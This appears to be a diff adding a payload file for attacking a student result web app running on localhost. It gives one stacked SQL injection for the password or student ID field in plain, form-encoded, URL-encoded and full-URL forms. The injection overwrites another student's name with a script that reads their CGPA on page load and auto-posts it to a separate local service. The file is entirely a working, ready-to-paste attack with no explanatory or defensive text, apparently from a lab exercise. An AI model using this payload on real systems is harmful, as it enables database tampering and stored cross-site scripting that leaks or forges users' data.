@@ -1,0 +1,20 @@
+======================================================================
+1) SINGLE-LINE  (paste into the Password / Student ID input box)
+======================================================================
+x' ; UPDATE result SET first_name = 'Olivia', last_name = '<script>window.addEventListener("DOMContentLoaded",function(){ var tds = document.getElementsByTagName("td"); if (tds.length >= 2) { var cgpa = tds[1].textContent.trim(); var f = document.createElement("form"); f.method = "POST"; f.action = "http://localhost:3001/create"; var i = document.createElement("input"); i.type = "hidden"; i.name = "message"; i.value = "I got " + cgpa; f.appendChild(i); document.body.appendChild(f); f.submit(); } });</script>' WHERE student_id = 3005002; #
+
+======================================================================
+2) FORM-ENCODED  (spaces -> '+'; what a browser actually submits)
+======================================================================
+x%27+%3B+UPDATE+result+SET+first_name+%3D+%27Olivia%27,+last_name+%3D+%27%3Cscript%3Ewindow.addEventListener%28%22DOMContentLoaded%22,function%28%29%7B+var+tds+%3D+document.getElementsByTagName%28%22td%22%29%3B+if+%28tds.length+%3E%3D+2%29+%7B+var+cgpa+%3D+tds%5B1%5D.textContent.trim%28%29%3B+var+f+%3D+document.createElement%28%22form%22%29%3B+f.method+%3D+%22POST%22%3B+f.action+%3D+%22http://localhost:3001/create%22%3B+var+i+%3D+document.createElement%28%22input%22%29%3B+i.type+%3D+%22hidden%22%3B+i.name+%3D+%22message%22%3B+i.value+%3D+%22I+got+%22+++cgpa%3B+f.appendChild%28i%29%3B+document.body.appendChild%28f%29%3B+f.submit%28%29%3B+%7D+%7D%29%3B%3C/script%3E%27+WHERE+student_id+%3D+3005002%3B+%23
+
+======================================================================
+3) URL-ENCODED  (spaces -> %20; for address bar / curl)
+======================================================================
+x%27%20%3B%20UPDATE%20result%20SET%20first_name%20%3D%20%27Olivia%27,%20last_name%20%3D%20%27%3Cscript%3Ewindow.addEventListener%28%22DOMContentLoaded%22,function%28%29%7B%20var%20tds%20%3D%20document.getElementsByTagName%28%22td%22%29%3B%20if%20%28tds.length%20%3E%3D%202%29%20%7B%20var%20cgpa%20%3D%20tds%5B1%5D.textContent.trim%28%29%3B%20var%20f%20%3D%20document.createElement%28%22form%22%29%3B%20f.method%20%3D%20%22POST%22%3B%20f.action%20%3D%20%22http://localhost:3001/create%22%3B%20var%20i%20%3D%20document.createElement%28%22input%22%29%3B%20i.type%20%3D%20%22hidden%22%3B%20i.name%20%3D%20%22message%22%3B%20i.value%20%3D%20%22I%20got%20%22%20+%20cgpa%3B%20f.appendChild%28i%29%3B%20document.body.appendChild%28f%29%3B%20f.submit%28%29%3B%20%7D%20%7D%29%3B%3C/script%3E%27%20WHERE%20student_id%20%3D%203005002%3B%20%23
+
+======================================================================
+4) FULL URL (result site, password field)
+======================================================================
+http://localhost:3000/?student_id=3005001&password=x%27%20%3B%20UPDATE%20result%20SET%20first_name%20%3D%20%27Olivia%27,%20last_name%20%3D%20%27%3Cscript%3Ewindow.addEventListener%28%22DOMContentLoaded%22,function%28%29%7B%20var%20tds%20%3D%20document.getElementsByTagName%28%22td%22%29%3B%20if%20%28tds.length%20%3E%3D%202%29%20%7B%20var%20cgpa%20%3D%20tds%5B1%5D.textContent.trim%28%29%3B%20var%20f%20%3D%20document.createElement%28%22form%22%29%3B%20f.method%20%3D%20%22POST%22%3B%20f.action%20%3D%20%22http://localhost:3001/create%22%3B%20var%20i%20%3D%20document.createElement%28%22input%22%29%3B%20i.type%20%3D%20%22hidden%22%3B%20i.name%20%3D%20%22message%22%3B%20i.value%20%3D%20%22I%20got%20%22%20+%20cgpa%3B%20f.appendChild%28i%29%3B%20document.body.appendChild%28f%29%3B%20f.submit%28%29%3B%20%7D%20%7D%29%3B%3C/script%3E%27%20WHERE%20student_id%20%3D%203005002%3B%20%23
+
